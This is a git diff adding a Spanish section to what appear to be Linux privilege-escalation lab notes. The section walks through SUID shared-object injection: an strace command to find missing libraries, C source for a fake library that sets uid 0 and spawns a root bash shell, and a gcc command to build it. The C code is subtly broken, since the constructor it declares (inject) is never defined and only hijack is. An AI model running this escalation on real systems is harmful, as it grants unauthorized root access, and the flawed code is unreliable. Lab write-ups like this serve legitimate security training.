@@ -261,6 +261,31 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 Para encontrar los explots, es buena idea buscar en google, exploitdb y github.
 
 ### [](#header-3)SUID / SGID Executables - Shared Object Injection
+En este caso, probaremos la vulnerabilidad en el ejecutable del archivo SUID. Que se encuentra en "/usr/local/bin/suid-so",insertando esta ruta ejecutaremos el archivo.
+
+Para visualizar las librerias que hacen falta de instalar, podemos usar el comando
+```s
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+Creamos la ruta que hace falta.
+Creamos la libreria falsa con el codigo siguiente
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void hijack() {
+	setuid(0);
+	system("/bin/bash -p");
+}
+```
+Compilamos el archivo como objeto compartido con
+```s
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+Ejecutamos ahora el archivo de suid y tendremos nuestra shell.
+
 ### [](#header-3)SUID / SGID Executables - Environment Variables
 ### [](#header-3)SUID / SGID Executables - Abusing Shell Features (#1)
 ### [](#header-3)Passwords & Keys - History Files 
